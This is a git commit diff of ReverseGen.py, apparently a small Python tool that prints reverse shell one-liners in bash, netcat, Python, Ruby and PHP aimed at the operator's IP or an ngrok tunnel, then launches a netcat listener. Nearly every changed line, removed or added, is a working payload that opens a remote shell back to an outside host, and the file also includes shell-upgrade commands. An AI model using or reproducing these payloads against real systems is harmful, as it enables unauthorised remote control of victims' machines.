5d63defb65e851c6dff1b6085c82d2b5efb80f59
Youns92 <56968891+Youns92@users.noreply.github.com>
2023-07-13 15:00:24 +0200

    Update ReverseGen.py

--- ReverseGen.py
+++ ReverseGen.py
@@ -5,48 +5,36 @@ import time
 import os
 from pyngrok import ngrok
 
-
-
 # banner
-ascii_banner = pyfiglet.figlet_format("GenReverse")
-print(ascii_banner)
+print(pyfiglet.figlet_format("GenReverse"))
 
-a = time.ctime()
-# Afficher l'ip
 ip1 = IP(dst="0.0.0.0").src
 print(colored("####################################################", "blue"))
 print(colored("\nYour IP :", "red"), "[",ip1,"]")
 
+port = input("\nEnter the listening port : ")
 
-def reverseShell():
+def print_shell_commands(ip, port):
     print(colored("\n[BASH]", "blue"))
-    print("bash -i >& /dev/tcp/" + str(ip1) + "/" + str(port), "0>&1")
+    print(f"bash -i >& /dev/tcp/{ip}/{port} 0>&1")
     print(colored("\n[NETCAT]", "blue"))
-    print("nc -e /bin/sh " + str(ip1) + " " + str(port))
+    print(f"nc -e /bin/sh {ip} {port}")
     print(colored("\n[PYTHON]", "blue"))
-    print(
-        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" +str(
-            ip1) + "\"," + str(
-            port) + '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);')
+    print(f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
     print(colored("\n[RUBY]", "blue"))
-    print("ruby -rsocket -e'f=TCPSocket.open(\""+str(ip1)+"\","+str(port)+").to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'")
+    print(f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'")
     print(colored("\n[PHP]", "blue"))
-    print("php -r '$sock=fsockopen(\"" +str(ip1)+ "\"," +str(port)+ ");exec(""/bin/sh -i <&3 >&3 2>&3);'")
+    print(f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
     print(colored("\n[POWERSHELL]", "blue"))
-    
     print(colored("\n#############################################", "blue"))
     print(colored("\nTo upgrade the shell use:", "blue"))
-    print(colored("\npython -c 'import pty;pty.spawn(""/bin/bash"")'", "red"))
+    print(colored("\npython -c 'import pty;pty.spawn(\"/bin/bash\")'", "red"))
     print(colored("\nOr", "blue"))
     print(colored("\n/usr/bin/script -qc /bin/bash /dev/null", "red"))
     print(colored("\nLaunching the listener...", "red"))
     time.sleep(2)
-    os.system('\n\nsudo nc -lvnp' + str(port))
+    os.system(f'\n\nsudo nc -lvnp{port}')
 
-
-
-
-#Ngrok utilisation 
 def usengrok():
     print("\nActivation of Ngrok..")
     time.sleep(2)
@@ -54,57 +42,25 @@ def usengrok():
     ssh, port1 = connection.strip("tcp://").split(":")
     print("\nUrl ngrok: ", ssh)
     print("Port ngrok: ", port1)
-    print(colored("\n[BASH]", "blue"))
-    print("bash -i >& /dev/tcp/" + str(ssh) + "/" + str(port1), "0>&1")
-    print(colored("\n[NETCAT]", "blue"))
-    print("nc -e /bin/sh " + str(ssh) + " " + str(port1))
-    print(colored("\n[PYTHON]", "blue"))
-    print(
-        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" +str(
-            ssh) + "\"," + str(
-            port1) + '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"'")
-    print(colored("\n[RUBY]", "blue"))
-    print("ruby -rsocket -e'f=TCPSocket.open(\""+str(ssh)+"\","+str(port1)+").to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'")
-    print(colored("\n[PHP]", "blue"))
-    print("php -r '$sock=fsockopen(\"" +str(ssh)+ "\"," +str(port1)+ ");exec(""/bin/sh -i <&3 >&3 2>&3);'")
-    print(colored("\n#############################################", "blue"))
-    print(colored("\nTo upgrade the shell use:", "blue"))
-    print(colored("\npython -c 'import pty;pty.spawn(""/bin/bash"")'", "red"))
-    print(colored("\nOr", "blue"))
-    print(colored("\n/usr/bin/script -qc /bin/bash /dev/null", "red"))
-    print(colored("\nLaunching the listener:", "red"))
-    time.sleep(2)
+    print_shell_commands(ssh, port1)
     os.system('\n\nnc -lvp' + str(port))
 
+def reverseShell():
+    print_shell_commands(ip1, port)
 
-
-#port
-port = input("\nEnter the listening port : ")
-
-
-#Main
 def ip():
     a = input("\n1- Using Ngrok ?:\n2- Use this IP " + ip1 + " ?:\n\nMake your choice ? : ")
     if a == "1":
         usengrok()
-        return
-
-    if a == "2":
+    elif a == "2":
         reverseShell()
-        return
-        
-    if a == "3":
+    elif a == "3":
         ip2 = input("choisie ton ip:?")
         ip2 = ip1
         reverseShell()
-        
-        return
-
-    if a > "2":
-      print("Aurevoir") 
-
+    elif a > "2":
+        print("Aurevoir") 
     else:
         print("Faite un choix!")
-
 
 ip()
